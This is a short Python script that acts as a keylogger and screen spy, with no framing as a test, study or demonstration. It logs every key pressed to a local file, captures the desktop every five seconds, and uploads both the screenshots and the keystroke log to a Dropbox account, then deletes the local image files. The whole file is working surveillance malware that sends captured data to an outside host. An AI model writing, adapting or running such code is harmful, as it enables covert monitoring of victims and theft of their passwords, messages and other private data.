import pyscreenshot as ImageGrab
import dropbox
from datetime import datetime
import os
import threading
from pynput.keyboard import Key, Listener
import logging


dbx = dropbox.Dropbox('')

def main():
    create_log_file()
    threading.Timer(5.0, main).start()
    image = grab_desktop_image()
    get_dropbox_credentials()
    upload_image(image)
    remove_image(image)
    upload_log_file()
    
def grab_desktop_image():
    im=ImageGrab.grab()
    dt = datetime.now()
    fname = str(dt) + '.png'
    im.save(fname, 'png')
    return fname

def logger():
    logging.basicConfig(filename=("log.txt"), level=logging.INFO, format= '%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(key)

    with Listener(on_press=on_press) as listener:
        listener.join()

def create_log_file():
    try:
        f = open("log.txt", "a")
    except:
        print('')

def remove_image(image):
    try:
        os.remove("./" + image)
    except:
        print('something broke')

def get_dropbox_credentials():
    creds = dbx.users_get_current_account()

def upload_image(file_name):
    dropbox_path='/'
    with open(file_name, 'rb') as f:
        dbx.files_upload(f.read(),dropbox_path+file_name,mute=True)

def upload_log_file():
    dropbox_path='/'
    with open('log.txt', 'rb') as f:
        dbx.files_upload(f.read(),dropbox_path+'log.txt',mode=dropbox.files.WriteMode.overwrite)

if __name__ == '__main__':
    main()
    logger()


